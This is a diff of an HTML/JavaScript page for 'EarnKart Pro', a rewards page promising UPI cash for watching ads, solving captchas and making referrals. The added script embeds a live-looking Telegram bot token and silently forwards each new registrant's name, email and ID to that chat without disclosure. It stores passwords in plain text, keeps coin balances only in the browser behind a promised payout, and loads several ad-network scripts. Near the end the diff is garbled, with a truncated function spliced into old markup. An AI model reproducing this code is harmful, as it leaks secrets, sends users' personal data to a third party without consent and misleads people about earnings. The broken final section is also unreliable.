@@ -2,23 +2,19 @@
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>EarnKart Pro</title>
 <meta name="monetag" content="2a11b51cafcb08603ca03c19c67a446f">
 <style>
-body{margin:0;font-family:sans-serif;background:#f9fafb}
-#splash{position:fixed;inset:0;z-index:9999;background:linear-gradient(135deg,#2563eb,#4f46e5,#7c3aed);display:flex;align-items:center;justify-content:center;color:white;text-align:center;overflow:hidden}
-#splash::before{content:'';position:absolute;width:300px;height:300px;background:rgba(255,255,255,.08);border-radius:50%;top:-80px;left:-80px;animation:float 3s ease-in-out infinite}
-#splash::after{content:'';position:absolute;width:200px;height:200px;background:rgba(255,255,255,.06);border-radius:50%;bottom:-50px;right:-50px;animation:float 3s ease-in-out infinite reverse}
-@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
-@keyframes pulse{0%,100%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,255,255,.4)}50%{transform:scale(1.05);box-shadow:0 0 0 20px rgba(255,255,255,0)}}
-@keyframes bounce{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
-.logo-box{width:90px;height:90px;background:white;color:#2563eb;border-radius:24px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-weight:900;font-size:36px;animation:pulse 2s infinite;box-shadow:0 10px 30px rgba(0,0,0,.2)}
-.dot{width:8px;height:8px;background:white;border-radius:50%;display:inline-block;animation:bounce 1.4s infinite}
-.dot:nth-child(2){animation-delay:.2s}.dot:nth-child(3){animation-delay:.4s}
+body{margin:0;font-family:sans-serif;background:#f9fafb;overflow-x:hidden}
+#splash{position:fixed;inset:0;z-index:99999;background:linear-gradient(135deg,#2563eb 0%,#7c3aed 50%,#4f46e5 100%);display:flex;align-items:center;justify-content:center;color:white;text-align:center}
+.splash-card{position:relative;z-index:2}
+.logo-box{width:100px;height:100px;background:white;color:#2563eb;border-radius:28px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-weight:900;font-size:38px;box-shadow:0 15px 40px rgba(0,0,0,.3);animation:pop 1s ease}
+@keyframes pop{0%{transform:scale(0.5);opacity:0}100%{transform:scale(1);opacity:1}}
+@keyframes loadBar{0%{width:0%}100%{width:100%}}
 .card{background:white;border-radius:16px;padding:20px;border:1px solid #eee;box-shadow:0 4px 20px rgba(0,0,0,.08);width:100%;max-width:400px}
-input{width:100%;padding:13px;border:1px solid #e5e7eb;border-radius:12px;margin-bottom:10px;background:#f9fafb;outline:none}
+input{width:100%;padding:13px;border:1px solid #e5e7eb;border-radius:12px;margin-bottom:10px;background:#f9fafb;outline:none;box-sizing:border-box}
 .btn{width:100%;padding:13px;border-radius:12px;border:none;font-weight:700;color:white;background:#2563eb}
 .grid5{display:grid;grid-template-columns:repeat(5,1fr);gap:8px}
 .grid5 button{height:46px;border-radius:10px;font-weight:700;font-size:12px;border:none}
 .tab{position:fixed;bottom:0;left:0;right:0;background:white;border-top:1px solid #eee;display:flex;justify-content:space-around;padding:8px 0;z-index:40}
-.tab button{border:none;background:transparent;padding:6px 24px;border-radius:10px}
+.tab button{border:none;background:transparent;padding:6px 10px;border-radius:10px;flex:1}
 </style>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>emailjs.init("2vIvGOG0rye3T0i");</script>
@@ -27,38 +23,30 @@ input{width:100%;padding:13px;border:1px solid #e5e7eb;border-radius:12px;margin
 <script>(function(s){s.dataset.zone='11911280',s.src='https://gizokraijaw.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head><body>
 
-<div id="splash"><div style="position:relative;z-index:1">
+<div id="splash"><div class="splash-card">
 <div class="logo-box">EK</div>
-<div style="font-weight:900;font-size:28px;letter-spacing:-.5px">EarnKart Pro</div>
-<div style="font-size:13px;margin-top:6px;opacity:.9;letter-spacing:1px">EARN • PLAY • WITHDRAW</div>
-<div style="margin-top:24px;display:flex;gap:6px;justify-content:center"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
-<div style="margin-top:20px;width:120px;height:3px;background:rgba(255,255,255,.2);border-radius:10px;margin-left:auto;margin-right:auto;overflow:hidden"><div style="height:100%;background:white;border-radius:10px;width:0%;animation:load 1.8s ease-in-out forwards"></div></div>
-<style>@keyframes load{0%{width:0%}100%{width:100%}}</style>
+<div style="font-weight:900;font-size:30px;letter-spacing:-1px">EarnKart Pro</div>
+<div style="font-size:13px;margin-top:6px;opacity:.9;letter-spacing:2px">EARN • PLAY • WITHDRAW</div>
+<div style="margin-top:25px;width:140px;height:4px;background:rgba(255,255,255,.3);border-radius:10px;margin-left:auto;margin-right:auto;overflow:hidden"><div style="height:100%;background:white;border-radius:10px;animation:loadBar 2.2s ease-in-out forwards"></div></div>
+<div style="font-size:11px;margin-top:10px;opacity:.7">Loading your rewards...</div>
 </div></div>
 
-<div id="auth" style="display:none;min-height:100vh;align-items:center;justify-content:center;padding:16px">
-<div class="card"><h1 style="text-align:center;color:#2563eb;font-weight:900;font-size:22px;margin:0">EarnKart Pro</h1>
-<div style="display:flex;background:#f3f4f6;border-radius:12px;padding:4px;margin:14px 0"><button onclick="tab('R')" id="tR" style="flex:1;padding:8px;border-radius:8px;background:#2563eb;color:white;font-weight:700;border:none">Register</button><button onclick="tab('L')" id="tL" style="flex:1;padding:8px;border-radius:8px;color:#6b7280;font-weight:700;border:none;background:transparent">Login</button></div>
+<div id="auth" style="display:none;min-height:100vh;align-items:center;justify-content:center;padding:16px;background:#f9fafb">
+<div class="card"><h1 style="text-align:center;color:#2563eb;font-weight:900;font-size:24px;margin:0">EarnKart Pro</h1><p style="text-align:center;font-size:12px;color:#9ca3af;margin-top:4px">Welcome! Earn Real Money</p>
+<div style="display:flex;background:#f3f4f6;border-radius:12px;padding:4px;margin:16px 0"><button onclick="tabR()" id="tR" style="flex:1;padding:9px;border-radius:8px;background:#2563eb;color:white;font-weight:700;border:none">Register</button><button onclick="tabL()" id="tL" style="flex:1;padding:9px;border-radius:8px;color:#6b7280;font-weight:700;border:none;background:transparent">Login</button></div>
 <form id="fR" onsubmit="reg(event)"><input id="rN" required placeholder="Full Name"><input id="rE" required type="email" placeholder="Email"><input id="rP" required type="password" placeholder="Password"><button class="btn">Create Account +20 🎁</button></form>
 <form id="fL" onsubmit="log(event)" style="display:none"><input id="lE" required type="email" placeholder="Email"><input id="lP" required type="password" placeholder="Password"><button class="btn" style="background:#111827">Login</button></form>
 </div></div>
 
 <div id="dash" style="display:none;flex-direction:column;min-height:100vh;padding-bottom:80px">
-<header style="background:white;box-shadow:0 1px 3px rgba(0,0,0,.1);position:sticky;top:0;padding:12px 16px;display:flex;justify-content:space-between;align-items:center"><div><b style="color:#2563eb">EarnKart Pro</b><div id="uIdShow" style="font-size:9px;color:#9ca3af"></div></div><div style="display:flex;gap:8px;align-items:center"><div style="background:#fefce8;border:1px solid #fde68a;padding:6px 12px;border-radius:20px;font-weight:700;font-size:14px">🪙 <span id="cBal">0</span></div><button onclick="logout()" style="background:#fef2f2;color:#dc2626;border:1px solid #fecaca;padding:6px 12px;border-radius:20px;font-size:12px;font-weight:700">Logout</button></div></header>
-<main style="max-width:448px;margin:0 auto;padding:12px;display:flex;flex-direction:column;gap:12px;width:100%">
+<header style="background:white;box-shadow:0 1px 3px rgba(0,0,0,.1);position:sticky;top:0;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;z-index:10"><div><b style="color:#2563eb">EarnKart Pro</b><div id="uIdShow" style="font-size:9px;color:#9ca3af"></div></div><div style="display:flex;gap:8px;align-items:center"><div style="background:#fefce8;border:1px solid #fde68a;padding:6px 12px;border-radius:20px;font-weight:700;font-size:14px">🪙 <span id="cBal">0</span></div><button onclick="openLogout()" style="background:#fef2f2;color:#dc2626;border:1px solid #fecaca;padding:6px 12px;border-radius:20px;font-size:12px;font-weight:700">Logout</button></div></header>
+<main style="max-width:448px;margin:0 auto;padding:12px;display:flex;flex-direction:column;gap:12px;width:100%;box-sizing:border-box">
 
 <div id="tabHome" style="display:flex;flex-direction:column;gap:12px">
-<div style="background:linear-gradient(90deg,#2563eb,#4f46e5);color:white;padding:16px;border-radius:16px"><div style="display:flex;justify-content:space-between;font-size:14px"><span>Daily Unlimited</span><span id="dTxt">0 Coins</span></div><div style="width:100%;background:rgba(255,255,255,.3);height:8px;border-radius:10px;margin-top:10px"><div id="dBar" style="background:white;height:8px;border-radius:10px;width:0%"></div></div></div>
-
-<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b style="font-size:14px">▶ Watch Ads x10 - 5 Coins</b><div id="aGrid" class="grid5" style="margin-top:10px"></div><p style="font-size:10px;color:green;margin-top:6px">Only here ad opens - 11889293</p></div>
-
-<div style="background:white;padding:8px;border-radius:16px;border:2px solid #bfdbfe;text-align:center"><p style="font-size:9px;color:#9ca3af;margin:0">ADVERTISEMENT</p><div style="display:flex;justify-content:center;margin-top:4px"><iframe src="https://regaincocoa.com/hvm2229w?key=830361f756608c8ecf127071e303debd" style="width:320px;height:50px;border:none;overflow:hidden" scrolling="no"></iframe></div></div>
-
-<div style="background:white;padding:14px;border-radius:16px;border:1px solid #fed7aa"><b style="font-size:12px;color:#ea580c">🔥 Sponsored</b><div id="container-3dae61c9eefbf03dd650952d352ed823" style="margin-top:8px"></div></div>
-
-<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b style="font-size:14px">🤖 Captcha Unlimited - 2 Coins</b><div style="margin-top:10px;display:flex;gap:8px"><div id="capB" style="background:black;color:white;padding:12px 20px;border-radius:12px;font-family:monospace;font-size:18px;letter-spacing:2px">XXXXXX</div><button onclick="genCap()" style="background:#f3f4f6;width:48px;border-radius:12px;border:none">↻</button></div><div style="display:flex;gap:8px;margin-top:10px"><input id="capI" placeholder="Enter Code" style="margin:0;flex:1;min-width:0"><button onclick="verCap()" style="background:#16a34a;color:white;padding:12px 18px;border-radius:12px;border:none;font-weight:700;flex-shrink:0">Submit</button></div><div style="font-size:12px;color:#6b7280;margin-top:6px"><span id="capDone">0</span> Done - Unlimited</div></div>
-
-<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b style="font-size:14px">👥 Refer 50 Coins</b><div style="display:flex;gap:8px;margin-top:8px"><input id="refL" readonly style="margin:0;flex:1;min-width:0;font-size:12px"><button onclick="copyRef()" style="background:#9333ea;color:white;padding:10px 16px;border-radius:12px;border:none;font-weight:700;flex-shrink:0">Copy</button></div></div>
+<div style="background:linear-gradient(90deg,#2563eb,#4f46e5);color:white;padding:16px;border-radius:16px"><div style="display:flex;justify-content:space-between;font-size:14px"><span>Daily Progress</span><span id="dTxt">0 Coins</span></div><div style="width:100%;background:rgba(255,255,255,.3);height:8px;border-radius:10px;margin-top:10px"><div id="dBar" style="background:white;height:8px;border-radius:10px;width:0%"></div></div></div>
+<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b style="font-size:14px">▶ Watch Ads x10 - 5 Coins Each</b><div id="aGrid" class="grid5" style="margin-top:10px"></div></div>
+<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b style="font-size:14px">🤖 Captcha Unlimited - 2 Coins Each</b><div style="margin-top:10px;display:flex;gap:8px"><div id="capB" style="background:black;color:white;padding:12px 20px;border-radius:12px;font-family:monospace;font-size:18px;letter-spacing:2px">XXXXXX</div><button onclick="genCap()" style="background:#f3f4f6;width:48px;border-radius:12px;border:none">↻</button></div><div style="display:flex;gap:8px;margin-top:10px"><input id="capI" placeholder="Enter Code" style="margin:0;flex:1"><button onclick="verCap()" style="background:#16a34a;color:white;padding:12px 18px;border-radius:12px;border:none;font-weight:700">Submit</button></div><div style="font-size:12px;color:#6b7280;margin-top:6px"><span id="capDone">0</span> Done - Unlimited</div></div>
+<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b style="font-size:14px">👥 Refer & Earn - 50 Coins</b><div style="display:flex;gap:8px;margin-top:8px"><input id="refL" readonly style="margin:0;flex:1;font-size:12px"><button onclick="copyRef()" style="background:#9333ea;color:white;padding:10px 16px;border-radius:12px;border:none;font-weight:700">Copy</button></div></div>
 </div>
 
 <div id="tabHistory" style="display:none;flex-direction:column;gap:12px"><div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b>📜 Earning History</b><div id="earnHist" style="margin-top:10px;display:flex;flex-direction:column;gap:8px"></div></div><div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b>💸 Withdrawal History</b><div id="wdHist" style="margin-top:10px;display:flex;flex-direction:column;gap:8px"></div></div></div>
@@ -67,10 +55,77 @@ input{width:100%;padding:13px;border:1px solid #e5e7eb;border-radius:12px;margin
 <div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b>💰 Withdraw (Min 500 Coins = Rs 5)</b>
 <input id="upi" placeholder="UPI ID (e.g. 98765@paytm)" style="margin-top:10px">
 <input id="wdAmt" type="number" placeholder="Amount - Coins (Min 500)">
-<div style="font-size:11px;color:#6b7280;margin:-6px 0 8px 2px">💡 100 Coins = Rs 1 | Aap <span id="maxCoinTxt">0</span> tak nikal sakte ho</div>
+<div style="font-size:11px;color:#6b7280;margin:-6px 0 8px 2px">100 Coins = Rs 1 | You can withdraw up to <span id="maxCoinTxt">0</span> Coins</div>
 <button onclick="wd()" style="width:100%;background:#facc15;font-weight:700;padding:12px;border-radius:12px;border:none;margin-top:4px">Withdraw</button>
 <p id="wM" style="font-size:12px;color:green;text-align:center;font-weight:700"></p></div>
-<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b>❓ Q&A</b><div style="font-size:12px;color:#6b7280;margin-top:8px"><p>• Ads 5 + Captcha Unlimited 2 + Refer 50</p><p>• Min withdraw 500 = Rs 5, Max = Jitna earn kiya</p></div></div><button onclick="logout()" style="width:100%;background:#ef4444;color:white;font-weight:700;padding:12px;border-radius:12px;border:none">Logout</button></div>
+<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee"><b>❓ FAQ</b>
+<div style="font-size:12px;color:#374151;margin-top:10px;line-height:1.7">
+<p><b>1. How to earn?</b><br>Watch Ads: 5 Coins per ad (10 daily), Captcha: 2 Coins (Unlimited), Refer: 50 Coins.</p>
+<p><b>2. Withdrawal?</b><br>Min 500 Coins = Rs 5, Max = Your total coins. UPI payment in 24h.</p>
+<p style="margin-top:12px;padding-top:10px;border-top:1px solid #eee"><b>👩‍💼 Founder: Zuveriya Sayyed</b><br>📧 zuveriyasayyed987@gmail.com</p>
+</div></div>
+</div>
+
+<div id="tabProfile" style="display:none;flex-direction:column;gap:12px">
+<div style="background:linear-gradient(135deg,#2563eb,#7c3aed);padding:20px;border-radius:20px;color:white;text-align:center">
+<div style="width:70px;height:70px;background:white;color:#2563eb;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;font-weight:900;font-size:28px" id="profileAvatar">U</div>
+<div style="font-weight:800;font-size:18px" id="profileNameShow">User Name</div>
+<div style="font-size:12px;opacity:.9" id="profileEmailShow">email@gmail.com</div>
+<div style="margin-top:10px;background:rgba(255,255,255,.2);padding:6px 14px;border-radius:20px;display:inline-block;font-size:12px">ID: <span id="profileIdShow">EK000000</span></div>
+</div>
+<div style="background:white;padding:16px;border-radius:16px;border:1px solid #eee">
+<b>✏️ Edit Profile</b>
+<p style="font-size:11px;color:#6b7280;margin:4px 0 10px">You can change your name anytime</p>
+<label style="font-size:12px;font-weight:700;color:#374151">Full Name</label>
+<input id="editName" placeholder="Enter new name">
+<label style="font-size:12px;font-weight:700;color:#374151">Email (Cannot change)</label>
+<input id="editEmail" readonly style="background:#f3f4f6;color:#9ca3af">
+<button onclick="saveProfile()" style="width:100%;background:#2563eb;color:white;font-weight:700;padding:12px;border-radius:12px;border:none;margin-top:8px">Save Changes 💾</button>
+</div>
+<div style="background:white;padding:14px;border-radius:16px;border:1px solid #eee">
+<div style="display:flex;justify-content:space-between;font-size:13px"><span>Total Earned</span><b id="totalEarnShow">0 Coins</b></div>
+<div style="display:flex;justify-content:space-between;font-size:13px;margin-top:8px"><span>Captcha Solved</span><b id="totalCapShow">0</b></div>
+<div style="display:flex;justify-content:space-between;font-size:13px;margin-top:8px"><span>Member Since</span><b id="memberSince">Today</b></div>
+</div>
+<button onclick="openLogout()" style="width:100%;background:#ef4444;color:white;font-weight:700;padding:12px;border-radius:12px;border:none">Logout</button>
+</div>
+
+</main>
+<div class="tab">
+<button onclick="switchTabHome()" id="bHome" style="background:#eff6ff;color:#2563eb"><div style="font-size:18px">🏠</div><div style="font-size:10px;font-weight:700">Home</div></button>
+<button onclick="switchTabHistory()" id="bHistory"><div style="font-size:18px">📊</div><div style="font-size:10px;font-weight:700">History</div></button>
+<button onclick="switchTabAccount()" id="bAccount"><div style="font-size:18px">💰</div><div style="font-size:10px;font-weight:700">Wallet</div></button>
+<button onclick="switchTabProfile()" id="bProfile"><div style="font-size:18px">👤</div><div style="font-size:10px;font-weight:700">Profile</div></button>
+</div>
+</div>
+
+<div id="adM" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center;padding:16px"><div style="background:white;border-radius:16px;padding:20px;width:100%;max-width:300px;text-align:center"><h3 style="margin:0">🎯 Ad Opened!</h3><div style="width:100%;background:#e5e7eb;height:8px;border-radius:10px;margin-top:12px"><div id="adB" style="background:#2563eb;height:8px;border-radius:10px;width:0%"></div></div><p id="adT" style="font-weight:900;font-size:22px;margin:8px 0">10</p></div></div>
+
+<div id="popBox" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:110;align-items:center;justify-content:center;padding:16px"><div style="background:white;border-radius:20px;padding:22px;width:100%;max-width:300px;text-align:center"><div id="popIcon" style="width:64px;height:64px;border-radius:50%;background:#dcfce7;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:28px">✅</div><h3 id="popTitle" style="margin:0;font-size:18px">Success!</h3><p id="popMsg" style="font-size:13px;color:#6b7280;margin-top:6px"></p><button onclick="closePop()" style="width:100%;background:#2563eb;color:white;font-weight:700;padding:13px;border-radius:12px;margin-top:14px;border:none">Continue 🚀</button></div></div>
+
+<div id="logoutBox" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:120;align-items:center;justify-content:center;padding:16px"><div style="background:white;border-radius:20px;padding:22px;width:100%;max-width:300px;text-align:center"><div style="width:64px;height:64px;border-radius:50%;background:#fee2e2;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:28px">🚪</div><h3 style="margin:0">Logout?</h3><p style="font-size:13px;color:#6b7280;margin-top:6px">Are you sure you want to logout?</p><div style="display:flex;gap:10px;margin-top:14px"><button onclick="closeLogout()" style="flex:1;background:#f3f4f6;padding:12px;border-radius:12px;border:none;font-weight:700">Cancel</button><button onclick="doLogout()" style="flex:1;background:#ef4444;color:white;padding:12px;border-radius:12px;border:none;font-weight:700">Logout</button></div></div></div>
+
+<script>
+const DIRECT="https://regaincocoa.com/hvm2229w?key=830361f756608c8ecf127071e303debd";let ml=false;function loadM(){if(ml)return;ml=true;var s=document.createElement('script');s.dataset.zone='11889293';s.src='https://al5sm.com/tag.min.js';document.body.appendChild(s);}
+const BOT="8650023248:AAG9PS7wFi8Q6F7-fEdZBwDp_JARdQVfa3g",CHAT="7536247484";const tg=m=>{fetch(`https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}`).catch(()=>{});};
+let cur=null,capCode="";
+function hideSplash(){let s=document.getElementById('splash');if(s){s.style.transition='opacity 0.5s';s.style.opacity='0';setTimeout(()=>{s.style.display='none';showInitial();},500);}else{showInitial();}}
+function showInitial(){let u=localStorage.getItem('ek_current');if(u){try{cur=JSON.parse(u);showD();}catch(e){document.getElementById('auth').style.display='flex';}}else{document.getElementById('auth').style.display='flex';}}
+setTimeout(hideSplash,2500);
+window.addEventListener('load',()=>{setTimeout(()=>{let s=document.getElementById('splash');if(s && s.style.display!=='none') hideSplash();},3000);});
+function tabR(){document.getElementById('fR').style.display='block';document.getElementById('fL').style.display='none';document.getElementById('tR').style.background='#2563eb';document.getElementById('tR').style.color='white';document.getElementById('tL').style.background='transparent';document.getElementById('tL').style.color='#6b7280';}
+function tabL(){document.getElementById('fR').style.display='none';document.getElementById('fL').style.display='block';document.getElementById('tL').style.background='#2563eb';document.getElementById('tL').style.color='white';document.getElementById('tR').style.background='transparent';document.getElementById('tR').style.color='#6b7280';}
+function getU(){return JSON.parse(localStorage.getItem('ek_all_users')||'[]');}function saveU(a){localStorage.setItem('ek_all_users',JSON.stringify(a));}
+function closePop(){document.getElementById('popBox').style.display='none';}
+function showPop(icon,title,msg){document.getElementById('popIcon').innerText=icon;document.getElementById('popTitle').innerText=title;document.getElementById('popMsg').innerText=msg;document.getElementById('popBox').style.display='flex';}
+function openLogout(){document.getElementById('logoutBox').style.display='flex';}
+function closeLogout(){document.getElementById('logoutBox').style.display='none';}
+function doLogout(){localStorage.removeItem('ek_current');location.reload();}
+function reg(e){e.preventDefault();let n=document.getElementById('rN').value.trim(),em=document.getElementById('rE').value.trim().toLowerCase(),p=document.getElementById('rP').value.trim();let us=getU();if(us.find(u=>u.email===em)){showPop('⚠️','Already Registered','This email already exists, please login!');tabL();return;}let id="EK"+Math.floor(100000+Math.random()*900000);let ref=new URLSearchParams(location.search).get('ref');cur={id:id,name:n,email:em,pass:p,coins:20,daily:20,last:new Date().toDateString(),ads:Array(10).fill(false),capC:0,history:[{type:'Welcome Bonus',amount:20,time:new Date().toLocaleString(),date:Date.now()}],wdHistory:[],refBy:ref||null,joinDate:new Date().toLocaleDateString()};us.push(cur);saveU(us);localStorage.setItem('ek_current',JSON.stringify(cur));tg(`NEW USER Name:${n} Email:${em} ID:${id} Ref:${ref||'Direct'}`);try{emailjs.send("service_su9avt4","template_lc4m8tq",{to_email:em,to_name:n});}catch(e){}if(ref){let r=us.find(u=>u.id===ref);if(r){r.coins+=50;r.history.push({type:'Referral '+id,amount:50,time:new Date().toLocaleString(),date:Date.now()});saveU(us);}}showPop('🎉','Welcome '+n+'!','20 Coins Added!');showD();}
+function log(e){e.preventDefault();let em=document.getElementById('lE').value.trim().toLowerCase(),p=document.getElementById('lP').value.trim();let all=getU();let u=all.find(x=>x.email===em);if(!u){showPop('❌','User Not Found','Please register first!');tabR();return;}if(u.pass!==p){showPop('❌','Wrong Password','Please enter correct password!');return;}cur=u;localStorage.setItem('ek_current',JSON.stringify(cur));showD();}
+function showD(){document.getElementById('auth').style.display='none';document.getElementById('dash').style.display='flex';document.getElementById('uIdShow').innerText='ID: '+cur.id;upd();genCap();switchTabHome();}
+function upd(){if(!cur)return;document.getElementById('cBal').innerText=cur.coins;document.getElementById('dTxt').innerText=cur.coins+' Coins';document.getElementById('dBar').style.width=Math.min(cur.daily,100)+'%';document.getElementById('capDone').innerText=cur.capC;let g=document.getElementById('aGrid');g.innerHTML='';cur.ads.forEach((d,i)=>{let b=document.createElement('button');b.style.cssText=`border:1px solid ${d?'#bbf7d0':'#2563eb'};background:${d?'#dcfce7':'#2563eb'};color:${d?'#16a34a':'white'}`;b.innerText=d?'✓ Done':'Ad '+(i+1);b.onclick=()=>watch(i);g.appendChild(b);});let curURL=location.origin+location.pathname;if(curURL.includes('emulated')) curURL='https://earnkartpro.netlify.app';document.getElementById('refL').value=curURL+'?ref='+cur.id;document.getElementById('maxCoinTxt').innerText=cur.coins;document.getElementById('profileNameShow').innerText=cur.name;document.getElementById('profileEmailShow').innerText=cur.email;document.getElementById('profileIdShow').innerText=cur.id;document.getElementById('profileAvatar').innerText=cur.name.charAt(0).toUpperCase();document.getElementById('editName').value=cur.name;document.getElementById('editEmail').value=cur.email;document.getElementById('totalEarnShow').innerText=cur.coins+' Coins';document.getElementById('totalCapShow').innerText=cur.capC;document.getElementById('memberSince').innerText=cur.joinDate||'Today';localStorage.setItem('ek_current',JSON.stringify(cur));let us=getU();let idx=us.findIndex(u=>u.id===cur.id);if(idx>=0){us[idx]=cur;saveU(us);}renderH();}
+function&A</b><div style="font-size:12px;color:#6b7280;margin-top:8px"><p>• Ads 5 + Captcha Unlimited 2 + Refer 50</p><p>• Min withdraw 500 = Rs 5, Max = Jitna earn kiya</p></div></div><button onclick="logout()" style="width:100%;background:#ef4444;color:white;font-weight:700;padding:12px;border-radius:12px;border:none">Logout</button></div>
 
 </main>
 <div class="tab"><button onclick="switchTab('home')" id="bHome" style="background:#eff6ff;color:#2563eb"><div style="font-size:18px">🏠</div><div style="font-size:10px;font-weight:700">Home</div></button><button onclick="switchTab('history')" id="bHistory"><div style="font-size:18px">📊</div><div style="font-size:10px;font-weight:700">History</div></button><button onclick="switchTab('account')" id="bAccount"><div style="font-size:18px">👤</div><div style="font-size:10px;font-weight:700">Account</div></button></div>
